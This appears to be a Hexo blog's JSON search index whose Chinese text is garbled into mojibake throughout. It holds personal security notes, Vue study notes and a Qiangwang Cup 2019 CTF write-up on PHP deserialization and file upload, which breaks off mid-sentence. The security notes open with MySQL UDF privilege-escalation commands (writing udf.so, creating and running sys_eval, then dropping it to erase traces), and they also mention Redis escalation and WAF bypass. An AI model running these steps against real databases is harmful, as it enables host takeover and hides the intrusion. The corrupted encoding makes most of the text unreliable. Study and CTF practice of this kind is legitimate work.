å†™å…¥å†…å®¹ 1select unhex(&#x27;ç¬¬ä¸‰æ­¥hexçš„å†…å®¹&#x27;) into dump file &#x27;plugin_dir/udf.so&#x27; è¿›è¡Œå‡½æ•°å£°æ˜ä¸udf.soç›¸å…³è” 1create function sys_eval returns string soname &#x27;udf.so&#x27; æ‰§è¡Œ 1select sys_eval(&#x27;pwd&#x27;); ç—•è¿¹é”€æ¯ 1drop function sys_eval redisææƒ å®šæ—¶ä»»åŠ¡ å†™å…¥ssh ä¸šåŠ¡é€»è¾‘æ¼æ´é€»è¾‘æ¼æ´æ˜¯æŒ‡ç”±äºç¨‹åºé€»è¾‘ä¸ä¸¥æˆ–é€»è¾‘å¤ªå¤æ‚ï¼Œè€Œå¯¼è‡´ä¸€äº›é€»è¾‘åˆ†æ”¯ä¸èƒ½å¤Ÿæ­£å¸¸å¤„ç†æˆ–å¤„ç†é”™è¯¯ã€‚ ä¸€èˆ¬æœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µ å¯†ç æ‰¾å› ä»»æ„å¯†ç ä¿®æ”¹ï¼ˆæ²¡æœ‰æ—§å¯†ç è®¤è¯ï¼‰ è¶Šæƒè®¿é—® APIè°ƒç”¨ äº¤æ˜“æ”¯ä»˜è¿‡ç¨‹ â€¦â€¦ æƒé™æ§åˆ¶ç±»å¹³è¡Œè¶Šæƒ ç›¸åŒæƒé™ç”¨æˆ·ä¹‹é—´çš„æ“ä½œæƒé™æ§åˆ¶ä¸å½“ ä¸€ä¸ªæ­£å¸¸çš„ç”¨æˆ·aé€šå¸¸åªèƒ½å¯¹è‡ªå·±çš„ä¿¡æ¯è¿›è¡Œä¿®æ”¹ï¼Œä½†ç”±äºç³»ç»Ÿæœªå¯¹ä¿¡æ¯ä¿®æ”¹è¿›è¡Œä¸€ä¸ªåˆ¤æ–­ï¼Œåˆ¤æ–­å½“å‰æ“ä½œæ˜¯å¦å±äºå¯¹åº”çš„ç”¨æˆ·çš„æ“ä½œï¼Œå¯¼è‡´ç”¨æˆ·aå¯ä»¥æ“ä½œå…¶ä»–äººçš„ä¿¡æ¯ã€‚ é˜²æŠ¤ï¼šå¢åŠ è®¿é—®ä¸æ“ä½œå¯¹è±¡çš„ç”¨æˆ·å±æ€§ï¼Œåœ¨å¯¹ç›®æ ‡å¯¹è±¡è¿›è¡Œè®¿é—®ä¸æ“ä½œæ—¶ï¼ŒæœåŠ¡ç«¯æ ¡éªŒä¼šè¯ä¸å¯¹è±¡çš„ç”¨æˆ·å±æ€§ï¼Œåœ¨æ ¡éªŒé€šè¿‡åæ‰èƒ½æ‰§è¡Œè¯»å–å’Œæ“ä½œã€‚ å‚ç›´è¶Šæƒ ä¸åŒæƒé™ç”¨æˆ·ä¹‹é—´æƒé™æ§åˆ¶ä¸å½“ï¼Œå¤šå‘ç”Ÿå†ä½æƒé™ç”¨æˆ·è®¿é—®é«˜æƒé™ç”¨æˆ·èµ„æº ä¾‹å­ï¼šåœ¨åšå®¢è®ºå›ä¸­ï¼Œä¸€ä¸ªæ­£å¸¸çš„æ™®é€šç”¨æˆ·aï¼Œé€šè¿‡burpsuiteæŠ“åŒ…ä¿®æ”¹è‡ªå·±çš„ç”¨æˆ·IDä¸ºç®¡ç†å‘˜çš„ç”¨æˆ·IDï¼Œä½¿å…¶æˆåŠŸç™»å½•äº†ç®¡ç†å‘˜çš„å¸å·ã€‚ é˜²æŠ¤ï¼šæ‰€æœ‰è®¿é—®é‡‡å–é»˜è®¤æ‹’ç»æœºåˆ¶ï¼Œé‡‡å–åŸºäºè§’è‰²è®¿é—®æ§åˆ¶ï¼Œå¯¹äºå„ä¸ªåŠŸèƒ½çš„è®¿é—®ï¼Œè§„å®šä¸åŒè§’è‰²æ‹¥æœ‰ä¸åŒçš„è®¿é—®æƒé™ï¼Œå½“ç”¨æˆ·åœ¨ä½¿ç”¨è¯¥åŠŸèƒ½æ—¶ï¼Œç³»ç»Ÿè¦æ ¡å¯¹ç”¨æˆ·çš„æƒé™å’Œè®¿é—®æ§åˆ¶æœºåˆ¶æ˜¯å¦ä¸è§„å®šç›¸åŒï¼Œé€šè¿‡æ ¡å¯¹è€…æ‰èƒ½ä½¿ç”¨ï¼Œå¦åˆ™æ‹’ç»ä½¿ç”¨è¯¥åŠŸèƒ½ã€‚ æ¥å£æ§åˆ¶ ç‰¹æ®Šæ¥å£æ²¡æœ‰åšè®¿é—®æƒé™æ§åˆ¶ ä¾‹å­ï¼šåœ¨åšå®¢è®ºå›ä¸­ï¼Œä¸€ä¸ªæ­£å¸¸çš„æ™®é€šç”¨æˆ·aä½¿ç”¨å®˜æ–¹æä¾›çš„APIæ¥å£æ„é€ é“¾æ¥ï¼Œç”¨æˆ·bé€šè¿‡ç‚¹å‡»è¯¥é“¾æ¥åè¿›è¡Œå‘é€æˆ–è½¬å‘ç”¨æˆ·aæŒ‡å®šçš„å†…å®¹ã€‚ æ¥å£ç±»æ¼æ´å¤§å¤šæ•°éƒ½æ˜¯å› ä¸ºæ¥å£æ²¡æœ‰åšéªŒè¯æˆ–è€…å…¶ä»–é¢„é˜²æœºåˆ¶ï¼Œå¯¼è‡´è¢«æ”»å‡»è€…æ‰€åˆ©ç”¨ï¼Œæ¯”å¦‚ä¸€äº›ä¸‹è½½é“¾æ¥æ¥å£å¯¼è‡´æœªæˆæƒä¸‹è½½ï¼Œç™»å½•æ¥å£æ— éªŒè¯å¯¼è‡´æ’åº“ç­‰ç­‰ã€‚ ä¿®å¤å»ºè®® åŸºç¡€å®‰å…¨æ¶æ„ï¼Œå®Œå–„ç”¨æˆ·æƒé™ä½“ç³»ã€‚è¦çŸ¥é“å“ªäº›æ•°æ®å¯¹äºå“ªäº›ç”¨æˆ·ï¼Œå“ªäº›æ•°æ®ä¸åº”è¯¥ç”±å“ªäº›ç”¨æˆ·æ“ä½œ é‰´æƒï¼ŒæœåŠ¡ç«¯å¯¹è¯·æ±‚çš„æ•°æ®å’Œå½“å‰ç”¨æˆ·èº«ä»½åšæ ¡éªŒ ä¸è¦ç›´æ¥ä½¿ç”¨å¯¹è±¡çš„å®åæˆ–å…³é”®å­— å¯¹äºå¯æ§å‚æ•°è¿›è¡Œä¸¥æ ¼çš„æ£€æŸ¥ä¸è¿‡æ»¤ å¯†ç ä¿®æ”¹æ‰¾å›ç±»https://untitled-0on9w2imekga.runkit.sh/login? æ­£å¸¸é€»è¾‘ä¸‹ï¼Œå¯†ç é‡ç½®ã€å¯†ç æ‰¾å›éœ€è¦ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶ ç”¨æˆ·å èº«ä»½è¯å·ç  æ‰‹æœºçŸ­ä¿¡éªŒè¯ç  ç„¶è€ŒæŸäº›éªŒè¯ä¸ä¸¥å¯†çš„ï¼Œèº«ä»½è¯å·å’Œæ‰‹æœºçŸ­ä¿¡éªŒè¯ç å‡å¯ç»•è¿‡ï¼Œåªéœ€è¦çŸ¥é“ç”¨æˆ·åå°±å¯ä»¥é‡ç½®ä»»æ„ç”¨æˆ·å¯†ç  å‡­è¯å¯ç ´è§£ åˆ©ç”¨ç‚¹ï¼šçˆ†ç ´éªŒè¯ç  https://untitled-tthv7pk5xegg.runkit.sh/index? å‡­è¯å¯è·å– å¼€å‘äººå‘˜å°†éªŒè¯ä¿¡æ¯åŒ…å«åœ¨å“åº”åŒ…ä¸­ tokenå¯çŒœè§£ å‰ç«¯æ ¡éªŒ åœ¨å‰ç«¯è¿›è¡ŒéªŒè¯ï¼Œç›¸å½“äºæ²¡æœ‰è¿›è¡Œä»»ä½•é˜²èŒƒæªæ–½ï¼Œæ¯”å¦‚ç™»é™†çŠ¶æ€å¦‚æœåªä»¥ç™»é™†çŠ¶æ€ç è¿›è¡Œåˆ¤æ–­ç™»é™†æˆåŠŸæ ‡è¯†ï¼Œé‚£ä¹ˆä¿®æ”¹ç™»é™†çŠ¶æ€ç å°±èƒ½è¿›è¡Œç™»å½•ã€‚ å‰ç«¯åŒ…å«å¯¹éªŒè¯ç çš„æ ¡éªŒflagï¼Œå¯æ§ æ­¥éª¤å¯è·³è¿‡ é€šè¿‡è·³è¿‡æŸäº›å…³é”®æ­¥éª¤æ¥è¾¾åˆ°ä¿®æ”¹åˆ«äººå¯†ç çš„ç›®çš„ã€‚ æ”¯ä»˜é€»è¾‘ç±» æ”¯ä»˜è¿‡ç¨‹ä¸­å¯ä»¥ç›´æ¥ä¿®æ”¹æ•°æ®åŒ…ä¸­çš„æ”¯ä»˜é‡‘é¢ æ²¡æœ‰å¯¹è´­ä¹°æ•°é‡è¿›è¡Œå¤æ•°é™åˆ¶ è¯·æ±‚é‡æ”¾ï¼šé€šè¿‡å¤šçº¿ç¨‹åŒä¸€æ—¶é—´å‘é€å¤§é‡è¯·æ±‚ï¼Œå½“æ•°æ®åº“æœªåŠ é”æ—¶å‡ºé”™ï¼ˆæ¡ä»¶ç«äº‰ï¼‰ å‚æ•°å¹²æ‰°ï¼šä¼˜æƒ åˆ¸ï¼ŒåŒä¸€ä»£é‡‘åˆ¸é‡å¤ä½¿ç”¨ï¼Œä¸ºæ»¡è¶³æ¡ä»¶ä½¿ç”¨ä»£é‡‘åˆ¸ é€šç”¨æ¼æ´ å®šä¹‰ï¼šä¼ä¸šåŠäº’è”ç½‘ä¸­å¸¸ç”¨çš„æ“ä½œç³»ç»Ÿï¼Œç³»ç»Ÿç»„ä»¶ï¼Œé‡è¦çš„æ¡†æ¶ä»¥åŠåº”ç”¨ä¸­çš„å®‰å…¨æ¼æ´ PoCï¼šæŒ‡ä¸€æ®µæ¼æ´è¯æ˜çš„ä»£ç  CMSè¯†åˆ«ï¼šäº‘æºª WAFç»•è¿‡åˆ†ç±» äº‘WAF CDN WAF ä¸»æœºWAF ç»•è¿‡æ€è·¯ äº‘waf cdn WAFç»•è¿‡ï¼šå°è¯•ç›´æ¥è®¿é—®ä¸»ç«™ ä¸»æœºWAFï¼šé€šè¿‡å†…å®¹ç»•è¿‡ å¤§å°å†™ å†…è”æ³¨é‡Š æ¢è¡Œç¬¦","categories":[],"tags":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"vueç¬”è®°","slug":"vueç¬”è®°","date":"2020-03-13T16:00:00.000Z","updated":"2021-10-22T08:32:32.158Z","comments":true,"path":"2020/03/14/vueç¬”è®°/","link":"","permalink":"http://example.com/2020/03/14/vue%E7%AC%94%E8%AE%B0/","excerpt":"â€¦..","text":"â€¦.. ES6å±æ€§ é€Ÿå†™å±æ€§ 1234567var name = &#x27;abc&#x27;;var age = 123;var obg=&#123; name; //ä»¥å‰å†™æ³•ä¸ºname = name; age;&#125; ç®­å¤´å‡½æ•° 12345678var obj = &#123; &#125;var func = (a,b) =&gt; a + b;var func1 = a =&gt; a + 2;func(4,5); //9func1(2); //4 å®ä¾‹é€šè¿‡new Vue({â€¦.})åˆ›å»ºå®ä¾‹ é…ç½®å¯¹è±¡ä¸­çš„å†…å®¹ä¼šæå–åˆ°å®ä¾‹ä¸­ï¼š dataï¼šæ•°æ® props templateï¼šå­—ç¬¦ä¸²ï¼Œé…ç½®æ¨¡æ¿ methodsï¼šæ–¹æ³• computedï¼šé…ç½®è®¡ç®—å±æ€§ è®¡ç®—å±æ€§å’Œæ–¹æ³•çš„åŒºåˆ«ï¼šè®¡ç®—å±æ€§ä½¿ç”¨æ—¶ï¼Œæ—¶å½“ä½œå±æ€§ä½¿ç”¨ è®¡ç®—å±æ€§ä¼šè¿›è¡Œç¼“å­˜ï¼Œå¦‚æœä¾èµ–ä¸å˜ï¼Œåˆ™ä¼šç›´æ¥ä½¿ç”¨ç¼“å­˜ç»“æœï¼Œä¸ä¼šå¤šæ¬¡è¿›è¡Œè®¡ç®— æŒ‚è½½è®©vueå®ä¾‹æ§åˆ¶é¡µé¢ä¸­æŸä¸ªåŒºåŸŸçš„è¿‡ç¨‹ï¼Œç§°ä¹‹ä¸ºæŒ‚è½½ æ–¹å¼ï¼š é€šè¿‡el:â€cssé€‰æ‹©å™¨â€è¿›è¡Œé…ç½®ï¼Œel:â€#appâ€ é€šè¿‡vueå®ä¾‹ï¼Œapp.$mount(â€˜cssé€‰æ‹©å™¨â€™)è¿›è¡Œé…ç½® æ¨¡æ¿è¢«VUEæ§åˆ¶çš„é¡µé¢ç‰‡æ®µ ä½œç”¨ï¼š æé«˜æ¸²æŸ“æ•ˆç‡ï¼Œvueä¼šæŠŠæ¨¡æ¿æ¸²æŸ“æˆè™šæ‹ŸDOM æ ‘ï¼Œç„¶åå†ç”ŸæˆçœŸå®DOM æ ‘ ä¹¦å†™åœ¨å“ªï¼š åœ¨æŒ‚è½½å…ƒç´ ä¸­ç›´æ¥ä¹¦å†™ åœ¨templateä¸­ä¹¦å†™ åœ¨renderé…ç½®ä¸­ç”¨å‡½æ•°åˆ›å»º æ¨¡æ¿ä¸­å†™ä»€ä¹ˆ é™æ€å†…å®¹ æ’å€¼ï¼š æŒ‡ä»¤ v-bindï¼šç»‘å®šå±æ€§ã€‚innerHTML v-onï¼šç»‘å®šäº‹ä»¶ã€‚ç®€å†™ï¼š@ v-ifï¼šåˆ¤æ–­å…ƒç´ æ˜¯å¦éœ€è¦æ¸²æŸ“ v-showï¼šåˆ¤æ–­å…ƒç´ æ˜¯å¦åº”è¯¥æ˜¾ç¤º v-if æ˜¯åŠ¨æ€æ·»åŠ ï¼Œå½“å€¼ä¸º false æ—¶ï¼Œæ˜¯å®Œå…¨ç§»é™¤è¯¥å…ƒç´ ï¼Œå³ dom æ ‘ä¸­ä¸å­˜åœ¨è¯¥å…ƒç´ ã€‚ v-show ä»…æ˜¯éšè— / æ˜¾ç¤ºï¼Œå€¼ä¸º false æ—¶ï¼Œè¯¥å…ƒç´ ä¾æ—§å­˜åœ¨äº dom æ ‘ä¸­ã€‚è‹¥å…¶åŸæœ‰æ ·å¼è®¾ç½®äº† display: none åˆ™ä¼šå¯¼è‡´å…¶æ— æ³•æ­£å¸¸æ˜¾ç¤ºã€‚ v-forï¼šå¾ªç¯éå†ï¼Œå°±åœ°æ›´æ–°ï¼Œå¦‚æœå…ƒç´ çš„å€¼å‘ç”Ÿæ”¹å˜ï¼Œä¸ä¼šç§»åŠ¨domèŠ‚ç‚¹è¿›è¡Œæ›´æ–°ï¼Œè€Œæ˜¯æ ¹æ®ç»‘å®šçš„keyå€¼è¿›è¡Œæ›´æ–°ã€‚ v-bind:keyï¼šç”¨äºå¸®åŠ©åœ¨é‡æ–°æ¸²æŸ“æ—¶å…ƒç´ çš„æ¯”å¯¹ï¼Œé€šå¸¸å’Œv-foré…åˆä½¿ç”¨ï¼Œæé«˜æ¸²æŸ“æ•ˆç‡ v-modelï¼šå®ç°åŒå†™ç»‘å®šï¼Œè‡ªåŠ¨ç»‘å®švalueå±æ€§å€¼ï¼Œå¹¶æ³¨å†Œinputäº‹ä»¶ v-onceï¼šæ‰§è¡Œä¸€æ¬¡æ€§åœ°æ’å€¼ï¼Œå½“æ•°æ®æ”¹å˜æ—¶ï¼Œæ’å€¼å¤„çš„å†…å®¹ä¸ä¼šæ›´æ–° v-htmlï¼šæ¸²æŸ“è¾“å‡ºç»‘å®šçš„htmlä»£ç  ç»„ä»¶ESæ¨¡å—åŒ–å¯¼å‡º1234567891011//é»˜è®¤å¯¼å‡ºexport default function(a,b)&#123; return a+b;&#125;//å…·åå¯¼å‡º &#123; double:fn&#125;export function double(a)&#123; return a*2;&#125;//&#123;n : 3&#125;export var n = 3; å¯¼å…¥é¡»å…ˆåœ¨æ–‡ä»¶ä¸­å¯¼å‡ºæ‰èƒ½å¯¼å…¥ 12345import xxx from &#x27;jsæ–‡ä»¶è·¯å¾„&#x27; //å¯¼å…¥è·¯å¾„æ–‡ä»¶ä¸­çš„defaultimport &#123;double&#125; from &#x27;jsæ–‡ä»¶è·¯å¾„&#x27; //å…·åå¯¼å…¥import * as obj = from &#x27;jsæ–‡ä»¶è·¯å¾„&#x27; //å¯¼å…¥å…¨éƒ¨ ç»„ä»¶æ¦‚å¿µç»„ä»¶åŒ–ï¼Œå³æŠŠæ¯ä¸€ä¸ªé¡µé¢ä¸­åŒºåŸŸåŠŸèƒ½ç»†åˆ†ï¼Œæ¯ä¸€ä¸ªåŒºåŸŸæˆä¸ºä¸€ä¸ªç»„ä»¶ï¼Œæ¯ä¸ªç»„ä»¶åŒ…å«ï¼š åŠŸèƒ½ï¼ˆJSä»£ç ï¼‰ å†…å®¹ï¼ˆæ¨¡æ¿ä»£ç ï¼‰ æ ·å¼ï¼ˆCSSä»£ç ï¼‰ åˆ›å»ºç»„ä»¶ç»„ä»¶æ˜¯æ ¹æ®ä¸€ä¸ªæ™®é€šçš„é…ç½®å¯¹è±¡åˆ›å»ºçš„æ‰€ä»¥è¦å¼€å‘ä¸€ä¸ªç»„ä»¶ï¼Œ 1234567891011var myApp = &#123; data()&#123; return&#123; ...... &#125;; &#125;, method:&#123; &#125;&#125;.$mount(&#x27;#app&#x27;) æ³¨æ„ï¼Œç»„ä»¶ä¸­æ— elå…ƒç´ ï¼Œç”¨$mountè¿›è¡ŒæŒ‚è½½ dataå±æ€§æ˜¯å‡½æ•°æ¨¡å¼ æ³¨å†Œå’Œä½¿ç”¨ç»„ä»¶ å…¨å±€æ³¨å†Œåœ¨main.jsä¸­ 1Vue.component(â€œä½¿ç”¨åâ€,å¯¼å…¥åç§°) å±€éƒ¨æ³¨å†Œ1234567891011//ä½¿ç”¨&lt;componentName/&gt;//åœ¨viewæ–‡ä»¶å¤¹ä¸­import componentName from app.viewnew Vue(&#123; components:&#123; componentName; &#125;&#125;) ç»„ä»¶å‘½åè§„èŒƒ å¤§é©¼å³°å‘½åæ³•ï¼ˆå¯ç”¨çŸ­æ¨ªçº¿æ–¹å¼è°ƒç”¨ï¼‰ï¼š = çŸ­æ¨ªçº¿å‘½åæ³• ç»„ä»¶æ ‘ç»„ä»¶ä¹‹é—´ä¼ é€’æ•°æ® propsæ•°ç»„ï¼šå£°æ˜å¯ä»¥æ¥å—çš„æ•°æ® ä¼ é€’æ•°æ®çš„ç»„ä»¶ 12345678910&lt;user-info v-for=&quot;(item,i) in users&quot; :key=&quot;i&quot; :name=&#x27;item.name&#x27; &gt;new Vue(&#123; data:&#123; users:[ &#123;name:123&#125;, &#123;name:456&#125; ], &#125;,&#125;) æ¥æ”¶æ•°æ®çš„ç»„ä»¶ 1234567&lt;div&gt; &lt;p&gt;&#123;name&#125;&lt;/name&gt;&lt;/div&gt;new Vue(&#123; props:[&#x27;name&#x27;] &#125;) ç”Ÿå‘½å‘¨æœŸ beforeCreateï¼š createdï¼šappå®ä¾‹è¢«æŒ‚è½½ä¹‹å‰ï¼Œè·å–æ•°æ® beforeMountï¼šå®ä¾‹æŒ‚è½½ä¹‹å‰ mountedï¼šå®ä¾‹æŒ‚è½½ä¹‹å beforeDestoryï¼šé”€æ¯å‰ destoryedï¼šå®ä¾‹é”€æ¯å æ¨¡æ¿è¯­æ³• æ ¼å¼ï¼š 1&#123;&#123; &#125;&#125; å¯æ”¯æŒçš„å†…å®¹ï¼š 1.ç”¨æˆ·è‡ªå®šä¹‰çš„æ•°æ®ï¼Œéœ€é€šè¿‡v-bindç»‘å®šåˆ°èŠ‚ç‚¹ä¸Š 2.jså…¨å±€å˜é‡ï¼Œå¦‚joinå‡½æ•°ï¼Œdateå‡½æ•°ç­‰ jsè¡¨è¾¾å¼ï¼ˆä¸èƒ½æ˜¯è¯­å¥æˆ–è€…æµæ§åˆ¶å¥ï¼‰ 123456789//å¯ä»¥&#123;&#123; number + 1 &#125;&#125;&#123;&#123; ok ? &#x27;YES&#x27; : &#x27;NO&#x27; &#125;&#125;&#123;&#123; message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125;&#125;//ä¸å¯ä»¥&#123;&#123; var a = 1 &#125;&#125;&#123;&#123; if (ok) &#123; return message &#125; &#125;&#125; vue-cli12345# å®‰è£…npm i -g @vue-cli# åˆ›å»ºé¡¹ç›®vue create my-project å·¥ç¨‹ç»“æ„ node_modulesï¼šé¡¹ç›®ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“ public srcï¼šè‡ªå·±å†™çš„ä»£ç  main.jsï¼šå…¥å£æ–‡ä»¶ assetsï¼šå­˜æ”¾é™æ€æ–‡ä»¶ï¼Œimgç­‰ è¿è¡Œ 1234# æ‰“åŒ…ç”Ÿæˆnpm run build# è¿è¡Œnpm run serve element-ui12# å®‰è£…npm i element-ui -S å¼•å…¥ 12345678910111213# å®Œæ•´å¼•å…¥ main.jsä¸­import ElementUI from &#x27;element-ui&#x27;import &#x27;element-ui/lib/theme-chalk/index.css&#x27;;Vue.use(ElementUI);# å±€éƒ¨å¼•å…¥ main.jsä¸­import &#123; Button, Select &#125; from &#x27;element-ui&#x27;;Vue.component(Button.name, Button);Vue.component(Select.name, Select); router åŸºæœ¬æ ¼å¼ è·¯ç”±æ–‡ä»¶ä¸­ 1234567891011import VueRouter from &#x27;vue-router&#x27;Vue.use(VueRouter)const routes = []const router new VueRouter(&#123; routes&#125;)export default router ä¸€äº›ç‰¹æ€§ router.push() 12345678this.$router.push(&#x27;home&#x27;) //è·³è½¬åˆ°æŒ‡å®šè·¯å¾„const userId = &#x27;123&#x27;router.push(&#123; name: &#x27;user&#x27;, params: &#123; userId &#125;&#125;) // -&gt; /user/123router.push(&#123; path: `/user/$&#123;userId&#125;` &#125;) // -&gt; /user/123// è¿™é‡Œçš„ params ä¸ç”Ÿæ•ˆrouter.push(&#123; path: &#x27;/user&#x27;, params: &#123; userId &#125;&#125;) // -&gt; /user router.go(n)ï¼šåœ¨historyæ¨¡å¼ä¸­å‰è¿›æˆ–åé€€ï¼Œç›¸å½“äºforwardå’Œback å¯¼èˆªå®ˆå«åˆ¤æ–­æ˜¯å¦æœ‰æƒé™è®¿é—®ç›¸å…³é¡µé¢ 12345678910111213router.beforeEach((to,from,next) =&gt;&#123; //toå°†è¦è®¿é—®çš„è·¯å¾„ //fromä»£è¡¨ä»å“ªä¸ªé¡µé¢è®¿é—®çš„ //next æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¡¨ç¤ºæ”¾è¡Œï¼Œå³é€åˆ°toçš„åœ°å€ if (to.path === &quot;/login&quot;) return next(); //è·å–token const tokenStr = window.sessionStorage.getItem(&#x27;token&#x27;); //å¦‚æœtokenä¸ºç©ºï¼Œåˆ™é€åˆ°ç™»å½•ç•Œé¢ if(!tokenStr) return next(&#x27;/login&#x27;); //è‹¥ä¸ä¸ºç©ºï¼Œåˆ™é€åˆ°to next()&#125;)","categories":[],"tags":[{"name":"vue","slug":"vue","permalink":"http://example.com/tags/vue/"}]},{"title":"å¼ºç½‘æ¯2019-upload","slug":"å¼ºç½‘æ¯2019 upload å¤ç°WP","date":"2020-01-22T16:00:00.000Z","updated":"2021-10-22T08:34:46.489Z","comments":true,"path":"2020/01/23/å¼ºç½‘æ¯2019 upload å¤ç°WP/","link":"","permalink":"http://example.com/2020/01/23/%E5%BC%BA%E7%BD%91%E6%9D%AF2019%20upload%20%E5%A4%8D%E7%8E%B0WP/","excerpt":"å¼ºç½‘æ¯2019 upload å¤ç°WP åˆ†ææ•´ä½“reviewä¸€éï¼Œæ³¨å†Œç™»å½•èµ°ä¸€éï¼Œå¦å¤–å‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œç›´æ¥æäº¤phpåç¼€ä¼šæç¤ºforbiddenï¼Œä¼ å›¾ç‰‡æœ¨é©¬ï¼ŒæŠ“åŒ…ä¿®æ”¹ä¸Šä¼ ä¹Ÿæ— æ³•åˆ©ç”¨ã€‚ å‘ç°cookieæ˜¯ä¸€ä¸²base64çš„åŠ å¯†å­—ç¬¦ä¸²ï¼Œè§£å¯†åæ˜¯ä¸€ä¸²åºåˆ—åŒ–å­—ç¬¦ä¸².","text":"å¼ºç½‘æ¯2019 upload å¤ç°WP åˆ†ææ•´ä½“reviewä¸€éï¼Œæ³¨å†Œç™»å½•èµ°ä¸€éï¼Œå¦å¤–å‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œç›´æ¥æäº¤phpåç¼€ä¼šæç¤ºforbiddenï¼Œä¼ å›¾ç‰‡æœ¨é©¬ï¼ŒæŠ“åŒ…ä¿®æ”¹ä¸Šä¼ ä¹Ÿæ— æ³•åˆ©ç”¨ã€‚ å‘ç°cookieæ˜¯ä¸€ä¸²base64çš„åŠ å¯†å­—ç¬¦ä¸²ï¼Œè§£å¯†åæ˜¯ä¸€ä¸²åºåˆ—åŒ–å­—ç¬¦ä¸². é¦–å…ˆæƒ³åˆ°çš„æ˜¯ååºåˆ—åŒ–ï¼Œä½†æ˜¯ååºåˆ—åŒ–ä¸€èˆ¬éƒ½éœ€è¦æºç ï¼Œæ‰€ä»¥è¯•äº†www.zipå’Œwww.tar.gzï¼Œä¸‹è½½äº†æºç ã€‚ å…¨å±€æœç´¢unserilizeå‡½æ•°å’Œserializeå‡½æ•°ï¼Œå‘ç°åˆ†åˆ«åœ¨profile.phpå’Œindex.phpä¸­ã€‚ 12index.php unserialize() //å¯¹cookieè¿›è¡Œååºåˆ—åŒ–æ“ä½œ profile.php serialize() å…¨å±€æœç´¢é­”æ³•å‡½æ•° 123__desstruct() Register.php -&gt; class Register__call() profile.php -&gt; class profile__get() profile.php -&gt; class profile æ¢³ç†ä¸€ä¸‹è¿™å‡ ä¸ªé­”æ³•å‡½æ•°åœ¨phpååºåˆ—åŒ–ä¸­çš„ä½œç”¨ __destruct()ï¼šè°ƒç”¨unserialize()å‡½æ•°æ—¶ä¼šè‡ªåŠ¨è§¦å‘è¿™ä¸ªå‡½æ•° __call()ï¼šå½“è¢«è°ƒç”¨çš„æ–¹æ³•ä¸åœ¨æ­¤ç±»ä¸­æ—¶ï¼Œä¼šè§¦å‘è¿™ä¸ªå‡½æ•° __get()ï¼šå½“è°ƒç”¨çš„å±æ€§ä¸åœ¨æ­¤ç±»ä¸­æ—¶ï¼Œå°†è§¦å‘è¿™ä¸ªæ–¹æ³• åˆ†åˆ«åˆ—ä¸¾å‡ºè¿™å‡ ä¸ªå‡½æ•°çœ‹ä¸€ä¸‹ï¼š 1234567Register.phppublic function __destruct() &#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125; &#125; ä¼šè°ƒç”¨checkä¸­çš„indexæ–¹æ³•ã€‚ 12345678910111213profile.php public function __get($name) &#123; return $this-&gt;except[$name]; &#125; public function __call($name, $arguments) &#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125; ç»“åˆé¢˜ç›®åœºæ™¯ï¼Œç”¨æ–‡ä»¶ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬ï¼Œç„¶åèœåˆ€è¿æ¥getshellè·å–flagï¼Œä½†æ˜¯ä¸Šä¼ çš„å›¾ç‰‡æœ¨é©¬ä¼šè¢«æ”¹åï¼Œå¦å¤–æ¢³ç†ä¸€ä¸‹æºä»£ç é€»è¾‘ï¼Œæ‰¾ä¸€ä¸‹æ–‡ä»¶æ“ä½œä»£ç  12345678910111213141516171819202122232425262728profile.php public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;; $this-&gt;update_img(); &#125;else&#123; $this-&gt;error(&#x27;Forbidden type!&#x27;, url(&#x27;../index&#x27;)); &#125; &#125;else&#123; $this-&gt;error(&#x27;Unknow file type!&#x27;, url(&#x27;../index&#x27;)); &#125; &#125; æ¢³ç†ä¸€ä¸‹è¿™æ®µä»£ç çš„ä½œç”¨ 1.æ£€æŸ¥æ˜¯å¦ç™»å½• ã€‚this-&gt;checker=0æ—¶åˆ™ä¸è¿›å…¥æ­¤åˆ¤æ–­ã€‚ 2.æ£€æŸ¥æµé‡åŒ…ä¸­æ˜¯å¦å­˜åœ¨$_FILEï¼Œå­˜åœ¨åˆ™ä¼šè¿›å…¥ext_check()è¿›è¡Œåˆ¤æ–­ï¼Œçœ‹ä¸€ä¸‹etc_check()çš„ä»£ç  123456789public function ext_check()&#123; $ext_arr=explode(&quot;.&quot;,$this-&gt;filename); $this-&gt;ext=end($ext_arr); if($this-&gt;ext==&quot;png&quot;)&#123; return 1; &#125;else&#123; return 0; &#125;&#125; å‘ç°è¿™æ®µä»£ç å°±æ˜¯åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸ºpngæ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡è¿™ä¸ªåˆ¤æ–­ï¼Œç”±æ–‡ä»¶ä¸Šä¼ çš„çŸ¥è¯†å¯ä»¥çŸ¥é“ï¼Œå½“ç”¨GETæ–¹å¼ä¸Šä¼ 